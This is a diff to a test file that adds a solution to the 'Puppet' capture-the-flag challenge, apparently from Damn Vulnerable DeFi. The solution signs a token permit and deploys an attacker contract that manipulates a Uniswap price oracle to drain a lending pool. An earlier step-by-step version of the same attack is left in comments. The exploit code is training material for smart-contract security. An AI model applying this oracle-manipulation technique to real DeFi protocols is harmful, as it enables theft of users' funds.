@@ -95,6 +95,92 @@ describe('[Challenge] Puppet', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // await token.connect(player).approve(
+        //     uniswapExchange.address,
+        //     PLAYER_INITIAL_TOKEN_BALANCE
+        // );
+        // await uniswapExchange.connect(player).tokenToEthSwapOutput(
+        //     UNISWAP_INITIAL_ETH_RESERVE - (1n * 10n ** 17n),
+        //     PLAYER_INITIAL_TOKEN_BALANCE,
+        //     (await ethers.provider.getBlock('latest')).timestamp * 2,
+        //     { gasLimit: 1e6 }
+        // );
+
+        // await token.connect(player).transfer(uniswapExchange.address, await token.balanceOf(player.address));
+
+        // expect(
+        //     await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
+        // ).to.be.lt(await ethers.provider.getBalance(player.address));
+
+        // await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE, player.address, {value: PLAYER_INITIAL_ETH_BALANCE});
+        
+        const deadline = Math.floor(Date.now() / 1000) + 4200;
+        const nonces = await token.nonces(player.address);
+      
+        const domain = {
+          name: await token.name(),
+          version: "1",
+          chainId: 31337,
+          verifyingContract: token.address
+        };
+      
+        const types = {
+          Permit: [{
+              name: "owner",
+              type: "address"
+            },
+            {
+              name: "spender",
+              type: "address"
+            },
+            {
+              name: "value",
+              type: "uint256"
+            },
+            {
+              name: "nonce",
+              type: "uint256"
+            },
+            {
+              name: "deadline",
+              type: "uint256"
+            },
+          ],
+        };
+
+        const transactionCount = await player.getTransactionCount()
+        const futureAddress = ethers.utils.getContractAddress({
+            from: player.address,
+            nonce: transactionCount
+        })
+      
+        const values = {
+          owner: player.address,
+          spender: futureAddress,
+          value: PLAYER_INITIAL_TOKEN_BALANCE,
+          nonce: nonces,
+          deadline: deadline,
+        };
+
+        const signature = await player._signTypedData(domain, types, values);
+        const sig = ethers.utils.splitSignature(signature);
+
+        await (await ethers.getContractFactory('PuppetPoolAttacker', player)).deploy(
+            lendingPool.address,
+            token.address,
+            uniswapExchange.address,
+            POOL_INITIAL_TOKEN_BALANCE,
+            {
+                owner: player.address,
+                spender: futureAddress,
+                value: PLAYER_INITIAL_TOKEN_BALANCE,
+                deadline: deadline,
+                v: sig.v,
+                r: sig.r,
+                s: sig.s
+            },
+            {value: 24n * 10n ** 18n, gasLimit: 1e7}
+        );
     });
 
     after(async function () {
